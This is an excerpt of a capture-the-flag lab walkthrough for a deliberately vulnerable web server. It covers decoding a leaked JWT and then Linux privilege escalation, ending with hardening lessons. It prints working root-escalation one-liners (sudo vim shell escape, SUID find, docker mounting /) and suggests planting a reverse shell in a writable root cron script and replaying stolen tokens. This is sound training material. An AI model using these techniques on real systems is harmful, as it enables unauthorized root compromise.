# overclock Web Server (OCWA): Hybrid Walkthrough
...
> flag at a time. The flags stay censored (`FLAG{…}`), so you still run the final decode yourself.
...
**Upload response (the discovery, it prints the path):**
...
You've *spotted* a token; now copy it and decode it — no grep-into-a-variable, you work with the string itself, the way a real assessor does. A JWT uses **base64url** (`-` and `_` instead of `+` and `/`), so plain `base64 -d` chokes on it. Three ways, pick your comfort level:

```bash
d3coder '<token>'                                    # d3coder: hand it the whole token; prints header + payload
...
`d3coder` is a one-file, dependency-free decoder that ships with the lab — grab it once: `curl -sL https://raw.githubusercontent.com/0x31i/d3coder/main/d3coder -o /tmp/d3coder && sudo install -m 755 /tmp/d3coder /usr/local/bin/d3coder`. Or paste the token into **jwt.io** for a quick read — **but never paste real client tokens or secrets into a third-party site** (`d3coder` and `jwt_tool` keep it offline). The `sub` claim tells you whose token you're holding — often worth more than the flag, since it's what you'd replay against the next service.
...
> **The thinking.** We hold a real user but the last flags and full control of the box live behind root. You
> **enumerate every vector and let the box tell you** (`id`, `sudo -l`, SUID sweep, cron) rather than fixating
> on one, the lab ships **five** independent paths, so a student learns there is rarely a single way up.

**Goal.** Escalate to root, where the last flags live. Five independent paths ship on purpose; pick the cleanest.
**Try.** Enumerate (`id`, `sudo -l`, `find / -perm -4000`, cron), then exploit one: sudo/vim GTFOBins, SUID
`find`, docker group, or the world-writable root cron. Once root, collect the root-only flags.

<details>
<summary>Stuck? Reveal the full walkthrough</summary>

You never guess the vector, you run the standard local-enumeration sweep and let the box name it. Many of
these are dangerous because everyday programs (editors, pagers, interpreters, SUID utilities) spawn a shell
from *inside* themselves, a `NOPASSWD` sudo on `vim`, or the SUID bit on `find`, means "run any command as
root." That family is catalogued at [GTFOBins](https://gtfobins.github.io).
...
Five distinct roads to root, any one is enough.

#### Step 2: pick a vector and exploit it

```bash
sudo vim -c ':!/bin/bash'                                     # A - sudo GTFOBins (instant)
find . -exec /bin/sh -p \; -quit                              # B - SUID find (-p keeps root euid)
docker run -v /:/mnt --rm alpine cat /mnt/root/.docker_flag   # C - docker group -> Flag 24, and full root
# D - append a reverse shell to world-writable /opt/scripts/cleanup.sh (root cron, every 5 min)
```
...
#### Step 3: collect the root-only flags (unreadable until now)

These are `chmod 600`/root-owned, so a low-priv `cat` returned `Permission denied`:
...
**Command breakdown**
- `find / -perm -4000 -type f` lists SUID-root binaries (`backup_tool`, SUID `find`, `vulnerable_binary` are GTFOBins-style escapes); `find . -exec /bin/sh -p` keeps the elevated euid.
- `sudo -l` names the `NOPASSWD` editor (`vim :!` -> root); `id` reveals `docker` group (daemon runs as root, so a container mounting `/` reads any root file).
- Five independent paths (sudo GTFOBins, SUID find, SUID backup_tool, docker group, writable root cron), `linpeas`/`pspy` run the whole sweep for you.

**The lesson.** Grant sudo narrowly and never on shell-spawning programs; keep the `docker` group tightly
restricted (it is root-equivalent); make root-owned cron scripts non-writable; and audit SUID binaries.

**Flags found:** Flag 19 `FLAG{S******6}`, Flag 24 `FLAG{G******0}`, Flag 25 `FLAG{R******3}` (the final flag). Full compromise of the web server.
